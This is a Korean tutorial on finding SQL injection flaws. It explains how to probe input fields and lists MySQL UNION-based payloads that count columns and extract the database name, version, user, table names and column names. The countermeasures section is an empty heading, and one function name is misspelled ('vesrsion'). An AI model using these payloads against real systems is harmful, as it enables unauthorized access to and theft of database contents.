# 1. 취약점 정의

사용자의 입력 값이 서버의 쿼리문에서 사용되는 경우 공격자가 입력 값으로 SQL 쿼리문을 주입하여 개발자가 의도하지 않는 방향으로 쿼리문이 실행되도록 하는 취약점

# 2. 취약점 점검 방법

먼저 SQL Injection 취약점 발생 가능성이 존재할 것으로 보이는 기능을 식별한다. 서버의 DB와 연동되어 있을 것 같은 기능을 찾으면 되는데, 주로 로그인, 데이터 검색, 비밀번호 변경 등의 기능이 있다.

우선 SQL 문법에 영향을 줄 수 있는 특수문자(', ", \, ;, -- 등)를 입력해보며 반응을 살펴본다. 만약 SQL 문법에 에러가 발생하여 에러 메시지가 그대로 사용자 측 브라우저에 출력되면 SQL Injection이 발생할 가능성이 있는 것이다. 그리고 직접적으로 에러 메시지가 출력되지 않더라고 500 에러가 발생하거나 응답 페이지 내용 일부의 변화가 있다면 마찬가지로 SQL Injection이 발생할 가능성이 있다고 생각해볼 수 있다. 

추가로 여러 쿼리문을 입력해보았을 때 조회되는 데이터의 차이가 있다면 Blind SQL Injection 취약점의 발생 가능성을 생각해볼 수 있다. Blind SQL Injection은 서버에서 실행되는 SQL 쿼리문에 따라 가변하는 응답 값의 차이로 DB 내부 데이터를 유출하는 기법이다.

## 2.1. SQL Injection Payload

### UNION SQL Injection (MySQL)

```SQL
' order by 1-- 
' order by 2--
' order by 3-- 
' union select 1,2--
' union select 1,2,3--  
```

UNION SQL Injection 취약점이 존재한다면 먼저 ' order by 1-- 쿼리문을 주입하여 컬럼의 갯수를 알아내야 한다. union select는 select문에서 조회하는 컬럼 갯수와 일치하는 경우에만 실행되기 때문이다. 만약 ' order by 3-- 쿼리문을 실행할 때 에러가 발생한다면, 해당 기능에서 사용하는 테이블은 3개 이하의 컬럼을 가지고 있는 것이다. 그리고 union select 문을 주입하는데, 컬럼 갯수에 맞게 임의의 값을 입력하여 union select 문이 실행되도록 한다. 이제 실제로 다음과 같은 쿼리문을 주입하면 다른 정보를 유출시킬 수 있다.

```SQL
' union select 1,2,database();-- 현재 사용중인 데이터베이스 이름
' union select 1,2,vesrsion();-- 현재 사용중인 데이터베이스 버전
' union select 1,2,user();-- 현재 로그인된 계정
' union select 1,2,table_name from information_schema.tables;-- information_schema.tables 는 DBMS가 자체적으로 보유하고 있는 메인 데이터베이스/스키마이다. DB 종류, 테이블 목록, 컬럼 구조, 접근 권한 등의 관리용 정보가 여기에 담겨있다. 그리고 .tables는 information_schema 안에 들어있는 시스템 뷰(View) 이름으로, 해당 DB에 구축되어 있는 모든 테이블에 대한 명세 정보가 저장되어있다.
' union select column_name from information_schema.columns WHERE table_name = '[TABLE_NAME]';-- 
```



# 3. 대응방안
